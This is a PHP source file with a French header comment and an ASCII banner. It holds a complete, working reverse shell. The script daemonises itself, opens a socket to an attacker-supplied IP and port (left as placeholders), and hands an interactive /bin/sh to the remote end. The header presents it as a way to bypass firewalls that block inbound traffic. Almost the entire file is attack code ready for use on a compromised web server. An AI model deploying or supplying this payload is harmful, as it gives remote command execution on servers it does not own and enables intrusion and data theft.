<?php
/*
 [31m
   _____  .___  ________      _____    _______   
  /  _  \ |   | \______ \    /  _  \   \      \  
 /  /_\  \|   |  |    |  \  /  /_\  \  /   |   \ 
/    |    \   |  |    `   \/    |    \/    |    \
\____|__  /___| /_______  /\____|__  /\____|__  /
        \/              \/         \/         \/ 
 [0m
===========================================================================
[ EXPLICATION DU PAYLOAD : PHP REVERSE SHELL ]
===========================================================================
Ce script établit une connexion TCP sortante depuis le serveur cible vers 
l'IP/Port de l'auditeur. Il utilise 'proc_open' pour instancier un shell 
interactif (/bin/sh) et redirige les flux standards (STDIN, STDOUT, STDERR) 
vers le socket réseau. Cela permet de contourner les firewalls qui bloquent 
les connexions entrantes mais autorisent le trafic sortant.
===========================================================================
*/

set_time_limit (0);
$VERSION = "1.0";
$ip = '[VOTRE_IP]';  // CHANGE CECI
$port = [Votre port d ecoute];       // CHANGE CECI
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

// Tentative de démonisation (évite les processus zombies)
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) { exit(1); }
	if ($pid) { exit(0); }
	if (posix_setsid() == -1) { exit(1); }
	$daemon = 1;
}

chdir("/");
umask(0);

// Ouverture de la connexion socket
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { exit(1); }

$descriptorspec = array(
   0 => array("pipe", "r"), // stdin
   1 => array("pipe", "w"), // stdout
   2 => array("pipe", "w")  // stderr
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { exit(1); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
	if (feof($sock) || feof($pipes[1])) break;

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		$input = fread($sock, $chunk_size);
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		$input = fread($pipes[1], $chunk_size);
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		$input = fread($pipes[2], $chunk_size);
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
=============================================================================
